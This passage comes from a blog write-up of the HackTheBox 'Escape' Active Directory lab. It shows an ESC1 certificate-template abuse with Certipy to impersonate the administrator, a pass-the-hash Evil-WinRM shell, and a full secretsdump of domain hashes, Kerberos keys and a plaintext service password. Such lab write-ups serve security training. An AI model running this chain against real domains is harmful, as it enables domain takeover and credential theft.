class="string">&#x27;sequel-DC-CA&#x27;</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.</span><br><span class="line">[*] Trying to get CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Got CA configuration <span class="keyword">for</span> <span class="string">&#x27;sequel-DC-CA&#x27;</span></span><br><span class="line">[*] Saved BloodHound data to <span class="string">&#x27;20250430164217_Certipy.zip&#x27;</span>. Drag and drop the file into the BloodHound GUI from @ly4k</span><br><span class="line">[*] Saved text output to <span class="string">&#x27;20250430164217_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saved JSON output to <span class="string">&#x27;20250430164217_Certipy.json&#x27;</span></span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> 20250430164217_Certipy.tx</span><br><span class="line">0                                                                                                                                                                            16:42:48 [1082/5078]</span><br><span class="line">    Template Name                       : UserAuthentication                                                                                                                                       </span><br><span class="line">    Display Name                        : UserAuthentication                                                                                                                                       </span><br><span class="line">    Certificate Authorities             : sequel-DC-CA                                                                                                                                             </span><br><span class="line">    Enabled                             : True                                                                                                                                                     </span><br><span class="line">    Client Authentication               : True                                                                                                                                                     </span><br><span class="line">    Enrollment Agent                    : False                                                                                                                                                    </span><br><span class="line">    Any Purpose                         : False                                                                                                                                                    </span><br><span class="line">    Enrollee Supplies Subject           : True                                                                                                                                                     </span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                                                                  </span><br><span class="line">    Enrollment Flag                     : PublishToDs                                                                                                                                              </span><br><span class="line">                                          IncludeSymmetricAlgorithms                                                                                                                               </span><br><span class="line">    Private Key Flag                    : ExportableKey                                                                                                                                            </span><br><span class="line">    Extended Key Usage                  : Client Authentication                                                                                                                                    </span><br><span class="line">                                          Secure Email                                                                                                                                             </span><br><span class="line">                                          Encrypting File System                                                                                                                                   </span><br><span class="line">    Requires Manager Approval           : False                                                                                                                                                    </span><br><span class="line">    Requires Key Archival               : False                                                                                                                                                    </span><br><span class="line">    Authorized Signatures Required      : 0                                                                                                                                                        </span><br><span class="line">    Validity Period                     : 10 years                                                                                                                                                 </span><br><span class="line">    Renewal Period                      : 6 weeks                                                                                                                                                  </span><br><span class="line">    Minimum RSA Key Length              : 2048                                                                                                                                                     </span><br><span class="line">    Permissions                                                                                                                                                                                    </span><br><span class="line">      Enrollment Permissions                                                                                                                                                                       </span><br><span class="line">        Enrollment Rights               : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Domain Users                                                                                                                                  </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">      Object Control Permissions                                                                                                                                                                   </span><br><span class="line">        Owner                           : SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Owner Principals          : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Dacl Principals           : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">        Write Property Principals       : SEQUEL.HTB\Domain Admins                                                                                                                                 </span><br><span class="line">                                          SEQUEL.HTB\Enterprise Admins                                                                                                                             </span><br><span class="line">                                          SEQUEL.HTB\Administrator                                                                                                                                 </span><br><span class="line">    [!] Vulnerabilities                                                                                                                                                                            </span><br><span class="line">      ESC1                              : <span class="string">&#x27;SEQUEL.HTB\\Domain Users&#x27;</span> can enroll, enrollee supplies subject and template allows client authentication    </span><br></pre></td></tr></table></figure>
<p>给了一个ESC1的滥用<br>求一张</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ certipy req -ca sequel-DC-CA -template UserAuthentication -dc-ip 10.129.228.253 -target dc.sequel.htb -u ryan.cooper -p <span class="string">&quot;NuclearMosquito3&quot;</span> -ns 10.129.228.253 -upn administrator@sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 18</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ certipy auth -pfx administrator.pfx </span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">sudo</span> evil-winrm -i dc.sequel.htb -u administrator -H <span class="string">&quot;a52f78e4c751e5f5e17e1e9f3e58f4ee&quot;</span>                                 </span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/root/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; <span class="built_in">cd</span> ..</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator&gt; <span class="built_in">cd</span> desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator\desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-ar---        4/30/2025   7:55 AM             34 root.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; <span class="built_in">type</span> root.txt</span><br><span class="line">ba6b161dc83e8556b828d1a9017c2c87</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt; </span><br></pre></td></tr></table></figure>
<h2 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -k -no-pass sequel.htb/administrator@dc.sequel.htb             </span><br><span class="line">Impacket v0.11.0 - Copyright 2023 Fortra                                                         </span><br><span class="line">                                                                                                                                                                                                   </span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state                                                   </span><br><span class="line">[*] Starting service RemoteRegistry                                                              </span><br><span class="line">[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d                                  </span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)               </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cbf36a6101cb1a15e11f776ec6d5d77b:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                     </span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[-] SAM hashes extraction <span class="keyword">for</span> user WDAGUtilityAccount failed. The account doesn<span class="string">&#x27;t have hash information.</span></span><br><span class="line"><span class="string">[*] Dumping cached domain logon information (domain/username:hash)                                                                                                                                 </span></span><br><span class="line"><span class="string">[*] Dumping LSA Secrets                                                                          </span></span><br><span class="line"><span class="string">[*] $MACHINE.ACC                                                                                 </span></span><br><span class="line"><span class="string">sequel\DC$:plain_password_hex:cc9d5ea540f6ae97c66daeedd41fe8ecaf6cee114ac8eaf357da86e1ce2fa2987fc73fd54a5db4e07d16bd9e83275f6484e592610cc294f3f683793b2653e842067a03d96a1bd83cbe33ad48f4d8e4555a44b</span></span><br><span class="line"><span class="string">0bb95fa5f36af8f6ca77064f2985e3a3e08925d7d19c686f93b9b69d4a1ab348e92d61e242d3c4d636ae57e7e0766f095526dcf5ef85a64cf5cd213e04ecde1aa86706ea1a36e77a0ed94e0c869efa288d5b47e6874885969f180b029cd3ead8e2e</span></span><br><span class="line"><span class="string">e128b6f80b83f9500fb7e4e0dbc340e74bf43caaf5d0f103fcf73eed686661ff104ba1a1498fc0586fa208364bb4c8483de977525db1b3bebef96e86</span></span><br><span class="line"><span class="string">sequel\DC$:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::      </span></span><br><span class="line"><span class="string">[*] DPAPI_SYSTEM                                                                                 </span></span><br><span class="line"><span class="string">dpapi_machinekey:0x85ec8dd0e44681d9dc3ed5f0c130005786daddbd                                      </span></span><br><span class="line"><span class="string">dpapi_userkey:0x22043071c1e87a14422996eda74f2c72535d4931                                                                                                                                           </span></span><br><span class="line"><span class="string">[*] NL$KM </span></span><br><span class="line"><span class="string"> 0000   31 BF AC 76 98 3E CF 4A  FC BD AD 0F 17 0F 49 E7   1..v.&gt;.J......I.</span></span><br><span class="line"><span class="string"> 0010   DA 65 A6 F9 C7 D4 FA 92  0E 5C 60 74 E6 67 BE A7   .e.......\`t.g..</span></span><br><span class="line"><span class="string"> 0020   88 14 9D 4D E5 A5 3A 63  E4 88 5A AC 37 C7 1B F9   ...M..:c..Z.7...</span></span><br><span class="line"><span class="string"> 0030   53 9C C1 D1 6F 63 6B D1  3F 77 F4 3A 32 54 DA AC   S...ock.?w.:2T..</span></span><br><span class="line"><span class="string">NL$KM:31bfac76983ecf4afcbdad0f170f49e7da65a6f9c7d4fa920e5c6074e667bea788149d4de5a53a63e4885aac37c71bf9539cc1d16f636bd13f77f43a3254daac</span></span><br><span class="line"><span class="string">[*] _SC_MSSQL$SQLMOCK </span></span><br><span class="line"><span class="string">sequel\sql_svc:REGGIE1234ronnie</span></span><br><span class="line"><span class="string">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span><br><span class="line"><span class="string">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span><br><span class="line"><span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee:::</span></span><br><span class="line"><span class="string">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span><br><span class="line"><span class="string">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:170710980002a95bc62d176f680a5b40:::</span></span><br><span class="line"><span class="string">Tom.Henn:1103:aad3b435b51404eeaad3b435b51404ee:22e99d2b3043bbb0a480705c9b0e71ac:::</span></span><br><span class="line"><span class="string">Brandon.Brown:1104:aad3b435b51404eeaad3b435b51404ee:f562f509ad646c666f83b45f90a58af3:::</span></span><br><span class="line"><span class="string">Ryan.Cooper:1105:aad3b435b51404eeaad3b435b51404ee:98981eed8e9ce0763bb3c5b3c7ed5945:::</span></span><br><span class="line"><span class="string">sql_svc:1106:aad3b435b51404eeaad3b435b51404ee:1443ec19da4dac4ffc953bca1b57b4cf:::</span></span><br><span class="line"><span class="string">James.Roberts:1107:aad3b435b51404eeaad3b435b51404ee:cc69ea05e9ab430702679d5706b39075:::</span></span><br><span class="line"><span class="string">Nicole.Thompson:1108:aad3b435b51404eeaad3b435b51404ee:235da7fbef7d0861301b4078d56afdc5:::</span></span><br><span class="line"><span class="string">DC$:1000:aad3b435b51404eeaad3b435b51404ee:d1e9e6b7560bdb3317784b603a19c20e:::</span></span><br><span class="line"><span class="string">[*] Kerberos keys grabbed</span></span><br><span class="line"><span class="string">Administrator:aes256-cts-hmac-sha1-96:0ba0bb35571c5d0e19849c9c2b92539a4ce6a8fd3dd6348fb6a0888797dedd16</span></span><br><span class="line"><span class="string">Administrator:aes128-cts-hmac-sha1-96:37cbf2133cdec2b7e5531957a21e791f</span></span><br><span class="line"><span class="string">Administrator:des-cbc-md5:5d76e0d3c245a2a4</span></span><br><span class="line"><span class="string">krbtgt:aes256-cts-hmac-sha1-96:b3f74f6e968fb5d2cf17f36f417bc46259623626953ed30f8faf3cd00b91c8de</span></span><br><span class="line"><span class="string">krbtgt:aes128-cts-hmac-sha1-96:919e6861b6306e3367a9223a154473ec</span></span><br><span class="line"><span class="string">krbtgt:des-cbc-md5:6d1f1cd391e01a91</span></span><br><span class="line"><span class="string">Tom.Henn:aes256-cts-hmac-sha1-96:bb3886d7e3201d11055cf8a2ef587d83b448d33d77aab36dd84b4ce8c59fc0a2 </span></span><br><span class="line"><span class="string">Tom.Henn:aes128-cts-hmac-sha1-96:0a221bf0f01f109c86cc1668783b80d3</span></span><br><span class="line"><span class="string">Tom.Henn:des-cbc-md5:1a46dc3858150401</span></span><br><span class="line"><span class="string">Brandon.Brown:aes256-cts-hmac-sha1-96:1aad383c76610c43bf638873ff5d7f0d7cd5cffccdfb6dd16754f15b83217550</span></span><br><span class="line"><span class="string">Brandon.Brown:aes128-cts-hmac-sha1-96:cb92957a61468212c2e1f26f2958b892</span></span><br><span class="line"><span class="string">Brandon.Brown:des-cbc-md5:91b3a13edf6e6201</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes256-cts-hmac-sha1-96:b9a2b7df6161b9a31a15cfbbb17f68a5b3904eaa2ea21d8ed2ef9acb5e27b997</span></span><br><span class="line"><span class="string">Ryan.Cooper:aes128-cts-hmac-sha1-96:cbe89554da97001fa8fd0967f1799104</span></span><br><span class="line"><span class="string">Ryan.Cooper:des-cbc-md5:f4a445754f540104</span></span><br><span class="line"><span class="string">sql_svc:aes256-cts-hmac-sha1-96:bcbbff82091c7c6f9875261d3ada97274d01b4a1f93ceb16e8154606e392a4ae</span></span><br><span class="line"><span class="string">sql_svc:aes128-cts-hmac-sha1-96:decddf91c717c5a5b84e112f576ece3b</span></span><br><span class="line"><span class="string">sql_svc:des-cbc-md5:73ae15efdafe751f</span></span><br><span class="line"><span class="string">James.Roberts:aes256-cts-hmac-sha1-96:d503bb2c7eea7bf50e7f68ca967e4a6f8a903b22cffa07cf2c160580156f8a43</span></span><br><span class="line"><span class="string">James.Roberts:aes128-cts-hmac-sha1-96:33c8d3d907cd51ffa5274ce0b16ba448</span></span><br><span class="line"><span class="string">James.Roberts:des-cbc-md5:e53de99770a20bf2</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes256-cts-hmac-sha1-96:fd75cd1b02ed4cb838c996db6d7616157d19545c60fb23156abdb3a400bc371c</span></span><br><span class="line"><span class="string">Nicole.Thompson:aes128-cts-hmac-sha1-96:0c86380c787deb624027e9d1d8d71ab2</span></span><br><span class="line"><span class="string">Nicole.Thompson:des-cbc-md5:31b5e386b33e2589</span></span><br><span class="line"><span class="string">DC$:aes256-cts-hmac-sha1-96:7273137e3dec6556a5bdf7757e263b1c50320c00d5b0fff30b2dd4b01543c695</span></span><br><span class="line"><span class="string">DC$:aes128-cts-hmac-sha1-96:e7c64e545316e8cb28c860f10705e2bf</span></span><br><span class="line"><span class="string">DC$:des-cbc-md5:2ae0f438f4b97623</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br><span class="line"><span class="string">[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.</span></span><br><span class="line"><span class="string">[*] Cleaning up... </span></span><br><span class="line"><span class="string">[*] Stopping service RemoteRegistry</span></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
        
          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smb-enum"><span class="toc-number">1.1.</span> <span class="toc-text">smb enum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ntlm-hash-hijack"><span class="toc-number">1.2.</span> <span class="toc-text">ntlm hash hijack</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-sql-svc"><span class="toc-number">2.</span> <span class="toc-text">shell as sql_svc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get-pass-at-bak"><span class="toc-number">2.1.</span> <span class="toc-text">get pass at .bak</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-Ryan-Cooper"><span class="toc-number">3.</span> <span class="toc-text">shell as Ryan.Cooper</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1-classic-abuse"><span class="toc-number">3.1.</span> <span class="toc-text">ESC1 classic abuse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hashes"><span class="toc-number">4.</span> <span class="toc-text">Hashes</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&text=HackTheBox——Tracks AD Escape"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&is_video=false&description=HackTheBox——Tracks AD Escape"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——Tracks AD Escape&body=Check out this article: https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&title=HackTheBox——Tracks AD Escape"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&name=HackTheBox——Tracks AD Escape&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/06/19/Escape/HackTheBox%E2%80%94%E2%80%94Tracks%20AD%20Escape/&t=HackTheBox——Tracks AD Escape"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

<script>
(function(){
  // 计算滚动条宽度
  function scrollbarWidth() {
    return window.innerWidth - document.documentElement.clientWidth;
  }

  function applyCompensation() {
    const w = scrollbarWidth();
    if (w > 0) {
      document.documentElement.style.paddingRight = w + 'px';
      document.body.style.paddingRight = w + 'px';
    }
  }

  function clearCompensation() {
    document.documentElement.style.paddingRight = '';
    document.body.style.paddingRight = '';
  }

  // MutationObserver：监测 Fancybox 容器加入/移除（通用且不依赖 Fancybox API 版本）
  const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
      // 新增节点，若包含 Fancybox 容器则补偿
      for (const node of m.addedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          // slight delay to let browser apply overflow:hidden
          setTimeout(applyCompensation, 10);
        }
      }
      // 移除节点，若移除了 Fancybox 容器则清理补偿
      for (const node of m.removedNodes) {
        if (node.nodeType === 1 && node.classList && node.classList.contains('fancybox__container')) {
          clearCompensation();
        }
      }
    }
  });

  observer.observe(document.body, { childList: true, subtree: true });

  // 额外：监听全局点击可能关闭 modal 的元素（保险）
  document.addEventListener('click', (e) => {
    if (e.target.closest('.fancybox__backdrop') || e.target.closest('.fancybox__button--close') || e.target.closest('[data-fancybox-close]')) {
      // 确保在关闭时清理
      setTimeout(clearCompensation, 10);
    }
  });

  // 当窗口大小改变时也清理（避免残留）
  window.addEventListener('resize', () => {
    if (document.querySelector('.fancybox__container') == null) clearCompensation();
  });

  // 可选：当页面加载时清理一次（预防样式残留）
  window.addEventListener('load', clearCompensation);
})();
</script>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

<!-- FancyBox -->

    <script src='https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js'></script>


</body>
</html>
